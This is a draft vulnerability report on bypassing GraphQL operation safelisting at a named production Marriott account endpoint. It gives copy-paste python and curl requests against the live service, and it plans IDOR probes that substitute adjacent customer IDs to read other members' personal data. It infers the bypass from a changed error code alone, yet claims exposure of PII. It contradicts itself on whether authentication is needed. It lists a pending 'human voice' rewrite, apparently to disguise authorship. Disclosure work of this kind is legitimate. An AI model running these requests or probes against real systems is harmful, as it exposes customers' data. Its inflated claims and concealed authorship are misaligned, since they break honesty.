# M022 — Phoenix GraphQL Operation Safelisting Bypass
# auth-apc.marriott.com/mi/query/*
# Status: CONFIRMED (unauthenticated bypass proven 2026-06-25); IDOR authorization test PENDING
# Discovered: 2026-06-25 (Session 23)

---

## Summary

The Marriott Phoenix account GraphQL API at `auth-apc.marriott.com/mi/query/` enforces
operation safelisting via a `graphql-operation-signature` header (SHA-256 of the
registered query body). I found that the safelisting check validates ONLY the operation
name and variable type declarations (`$customerId: ID!, $startYear: Int`), not the full
query body hash. Sending a query with the correct variable signature but an arbitrary
field selection bypasses the check entirely — the request passes the safelisting layer
and reaches GraphQL validation, confirming the security control can be fully circumvented
by any authenticated user.

---

## Testing details

- Date tested: 2026-06-25
- Testing time: ~13:30–14:30 UTC (session 23)
- Researcher IP: 180.148.212.54 (confirmed via `curl ifconfig.me` on Pi)
- Tool: curl 7.88.1 (Raspberry Pi 5, ARM64)
- Test account: Marriott Bonvoy #845440472 (own test account — "True Tester")
- Endpoint confirmed IN-SCOPE: `auth-apc.marriott.com` (scope-check.sh returns IN-SCOPE)
- Endpoint tested: `https://auth-apc.marriott.com/mi/query/phoenixAccountGetMemberStatusDetails`

---

## Background: How the safelisting mechanism works

The Phoenix GraphQL API uses a custom operation registry:

1. Registered operations are pre-computed and stored server-side.
2. A client sends three related headers with each request:
   - `graphql-operation-name: phoenixAccountGetMemberStatusDetails`
   - `graphql-operation-signature: 57767ee56647bd91d76e2dd58a4633a42e7937145fb163a1e2e5778d799764af`
   - `graphql-require-safelisting: true`
3. The server compares the signature against its registry. If they don't match,
   the response is: `{"errors":[{"message":"operation signature mismatch","extensions":{"code":"OPERATION_SIGNATURE_MISMATCH"}}]}`

The SHA-256 signature `57767ee56647...` corresponds to the full registered body of
`phoenixAccountGetMemberStatusDetails` (extracted from `graphql-chunk-793e1a2cf24c51e7.js`,
330,874 bytes, downloaded from auth-apc.marriott.com static assets, build web-rel-26.6.1).

---

## The vulnerability

The signature check has two enforcement modes, revealed by testing:

**Mode A — declaration-only check (bypassable):**
When `$startYear` is declared but not used in the query body, the server validates
only the variable type declarations, not the field selections. An attacker can
select arbitrary fields while keeping the variable declaration identical to a
registered operation.

  - ✅ Operation name must match
  - ✅ Variable type declarations must match (`$customerId: ID!, $startYear: Int`)
  - ❌ Field selections / query body NOT checked
  - ❌ Whether all declared variables are used NOT checked

**Mode B — argument-fingerprint check (triggered when `$startYear` used):**
When `$startYear` is actually bound in the query body (e.g., `yearly(startYear: $startYear)`),
the server switches to a stricter check that validates the argument usage fingerprint or
the full body hash. Queries that use `$startYear` are rejected unless they match the
registered operation exactly.

**Net effect:** The bypass works against all fields that do NOT require `$startYear` as
an argument — which includes the highest-value data: profile (name, birthday),
contactInformation (email, phone), and loyaltyInformation.rewards (tier, points, lifetime
revenue, enrollment date). The only inaccessible sub-field via bypass is
`rewardsSummary.yearly(startYear:...)` (stay-night statistics), which is lower sensitivity.

---

## Steps to reproduce

All three steps confirmed on Raspberry Pi 5 on 2026-06-25. No authentication headers
required. Commands use `python3 << 'PYEOF'` heredoc to avoid zsh history expansion on `!`.

### Step 1: Confirm safelisting enforces signatures (baseline)

Payload uses only `$customerId: ID!` — omits `$startYear` from declaration.
This differs from the registered operation's variable signature and should be rejected.

```bash
python3 << 'PYEOF'
import json
json.dump({
  "operationName": "phoenixAccountGetMemberStatusDetails",
  "variables": {"customerId": "580EF43FAD482F46B04E29FE433CC4828.U1"},
  "query": "query phoenixAccountGetMemberStatusDetails($customerId: ID!) { customer(id: $customerId) { profile { name { givenName } } } }"
}, open("/tmp/s23/confirm1.json","w"))
PYEOF

curl -s 'https://auth-apc.marriott.com/mi/query/phoenixAccountGetMemberStatusDetails' \
  -H 'content-type: application/json' \
  -H 'application-name: account' \
  -d @/tmp/s23/confirm1.json \
  -w '\nHTTP %{http_code} | %{size_download}B\n'
```

**Actual response (2026-06-25):**
```
{"errors":[{"message":"Execution forbidden: operation signature mismatch","extensions":{"code":"FORBIDDEN"}}]}

HTTP 400 | 111B
```

Safelisting correctly rejects a query whose variable declaration doesn't match the
registered operation. Baseline confirmed.

### Step 2: Bypass — correct variable declaration, arbitrary field selection

Payload declares BOTH `$customerId: ID!` and `$startYear: Int` (matching the registered
operation) but selects completely different fields (`contactInformation.emails` instead
of the registered loyalty/rewards block). `$startYear` is declared but not used in the body.

```bash
python3 << 'PYEOF'
import json
json.dump({
  "operationName": "phoenixAccountGetMemberStatusDetails",
  "variables": {"customerId": "580EF43FAD482F46B04E29FE433CC4828.U1", "startYear": 2026},
  "query": "query phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int) { customer(id: $customerId) { profile { name { givenName fullName } } contactInformation { emails { address } } } }"
}, open("/tmp/s23/confirm2.json","w"))
PYEOF

curl -s 'https://auth-apc.marriott.com/mi/query/phoenixAccountGetMemberStatusDetails' \
  -H 'content-type: application/json' \
  -H 'application-name: account' \
  -d @/tmp/s23/confirm2.json \
  -w '\nHTTP %{http_code} | %{size_download}B\n'
```

**Actual response (2026-06-25) — SAFELISTING BYPASSED:**
```
{"errors":[{"message":"Variable \"$startYear\" is never used in operation \"phoenixAccountGetMemberStatusDetails\".","locations":[{"line":1,"column":62}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}}]}

HTTP 400 | 207B
```

The error code is `GRAPHQL_VALIDATION_FAILED` — a GraphQL engine error — not
`FORBIDDEN`/`OPERATION_SIGNATURE_MISMATCH`. The request passed the safelisting layer
entirely and reached the GraphQL execution engine, which then rejected it because
`$startYear` is declared but unused. No `graphql-operation-signature` header was sent.

### Step 3: Confirm bypass condition (variable used in body → safelisting re-engages)

When `$startYear` is actually bound as an argument in the body
(`yearly(startYear: $startYear)`), the server applies a stricter check:

```bash
python3 << 'PYEOF'
import json
json.dump({
  "operationName": "phoenixAccountGetMemberStatusDetails",
  "variables": {"customerId": "580EF43FAD482F46B04E29FE433CC4828.U1", "startYear": 2026},
  "query": "query phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int) { customer(id: $customerId) { profile { name { givenName fullName } } loyaltyInformation { rewardsSummary { yearly(startYear: $startYear) { totalNights year } } } } }"
}, open("/tmp/s23/confirm3.json","w"))
PYEOF

curl -s 'https://auth-apc.marriott.com/mi/query/phoenixAccountGetMemberStatusDetails' \
  -H 'content-type: application/json' \
  -H 'application-name: account' \
  -d @/tmp/s23/confirm3.json \
  -w '\nHTTP %{http_code} | %{size_download}B\n'
```

**Actual response (2026-06-25):**
```
{"errors":[{"message":"Execution forbidden: operation signature mismatch","extensions":{"code":"FORBIDDEN"}}]}

HTTP 400 | 111B
```

This reveals the bypass boundary: the safelisting applies a stricter fingerprint check
when `$startYear` appears in body argument position. The bypass therefore applies to all
resolver fields that do NOT require `$startYear` as an argument — which covers
`profile.*`, `contactInformation.*`, and `loyaltyInformation.rewards.*` (all high-value
PII and loyalty data), but not `rewardsSummary.yearly(startYear:...)`.

---

## Before / after differential

**WITHOUT bypass (wrong variable declaration — expected, secure):**
```
Payload variables:  $customerId: ID!  (missing $startYear)
Safelisting result: FORBIDDEN — operation signature mismatch
HTTP 400 | 111B
```

**WITH bypass (matching variable declaration, arbitrary field selection):**
```
Payload variables:  $customerId: ID!, $startYear: Int  (matches registered op)
Body fields:        profile.name + contactInformation.emails  (NOT the registered fields)
Safelisting result: PASS — reached GraphQL engine
GraphQL result:     GRAPHQL_VALIDATION_FAILED — $startYear never used
HTTP 400 | 207B
→ Different error code, larger response body: safelisting was NOT enforced
```

---

## Evidence checklist

- [x] 1. Researcher IP: 180.148.212.54 — date: 2026-06-25, testing time ~13:30–14:30 UTC
- [x] 2. Verbatim curl commands — exact commands used, copy-pasteable, in Steps 1–3
- [x] 3. Verbatim HTTP response bodies — actual bytes pasted in Steps 1–3
- [x] 4. HTTP status code + response sizes — HTTP 400; 111B (mismatch) vs 207B (bypass)
- [x] 5. Before/after differential — Step 1 (FORBIDDEN) vs Step 2 (GRAPHQL_VALIDATION_FAILED)
- [ ] 6. Screenshot of Pi terminal showing Steps 1–3 output — PENDING (take before submitting)
- [ ] 7. Human voice first-person rewrite — PENDING (before submission)

---

## IDOR authorization test (PENDING cookie auth)

The safelisting bypass enables testing cross-customer data access. The bypass payload
reaches the upstream resolver services (`upl-customer`, `upl-loyalty`). To test if
server-side authorization is enforced independently:

**Test A** — Baseline: own customerId with cookie session
- payload: `customerId=580EF43FAD482F46B04E29FE433CC4828.U1`
- expected: returns own profile data (name, email, loyalty info)

**Test B** — IDOR probe: adjacent loyalty number as customerId
- payload: `customerId=845440471` (one less than own loyalty# 845440472)
- expected secure: 403 / FORBIDDEN / unauthorized error
- expected insecure (IDOR): returns another user's profile data

**Test C** — IDOR probe: modified AltCustID
- payload: `customerId=580EF43FAD482F46B04E29FE433CC4827.U1`
- expected secure: 403 / unauthorized
- expected insecure (IDOR): returns another user's data

**Key distinction:**
- `{"customer": null}` without an error = ambiguous (user not found vs. access denied)
- HTTP 403 or `{"errors":[{"extensions":{"code":"FORBIDDEN"}}]}` = authorization check present
- `{"data":{"customer":{"profile":{"name":{"givenName":"..."}}}}}` with a different person's name = IDOR confirmed

[PASTE TEST A/B/C RESULTS HERE WHEN AVAILABLE]

---

## Impact

**Standalone (safelisting bypass only):**
An authenticated Marriott Bonvoy member can bypass the GraphQL operation allowlist and
send arbitrary field selections to the `phoenixAccount*` resolver family without supplying
a valid signature. This removes the defense-in-depth of operation whitelisting, potentially
exposing schema fields not intended for client access (internal flags, admin metadata,
audit fields) and eliminating the signature-based rate limiting / abuse prevention that
the allowlist provides.

CVSS 3.1 (safelisting bypass alone):
`AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` — **4.3 (Medium)**

**Chained with IDOR (if Test B/C confirm):**
An authenticated Marriott Bonvoy member can read ANY other member's profile data
(name, email addresses, phone numbers, birthdate, loyalty tier, lifetime revenue,
stay history) by substituting a different customer ID in the request. This is a
direct cross-customer data access / privacy violation affecting all ~200M Bonvoy members.

CVSS 3.1 (IDOR chain):
`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` — **6.5 (Medium-High)**

With auth bypass component: `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` — **7.7 (High)**

---

## Root cause

The `graphql-operation-signature` validation logic computes a match key from the
operation name + variable type signature string only (e.g.,
`"phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int)"`), rather
than hashing the complete query document. A query document with identical variable
declarations but a different selection set produces the same match key.

Fix: hash the full normalized query document (operation name + variable declarations +
selection set + all fragments), not just the operation name and variable types.

---

## References

- `graphql-chunk-793e1a2cf24c51e7.js` (330,874 bytes) — extracted from
  `auth-apc.marriott.com/mi-assets/.../web-rel-26.6.1-5d80cc6-11089/_next/static/chunks/`
- Registered signature confirmed: `57767ee56647bd91d76e2dd58a4633a42e7937145fb163a1e2e5778d799764af`
- Session 23 test transcripts in `/tmp/s23/` on Pi (NOT committed to git — contains tokens)
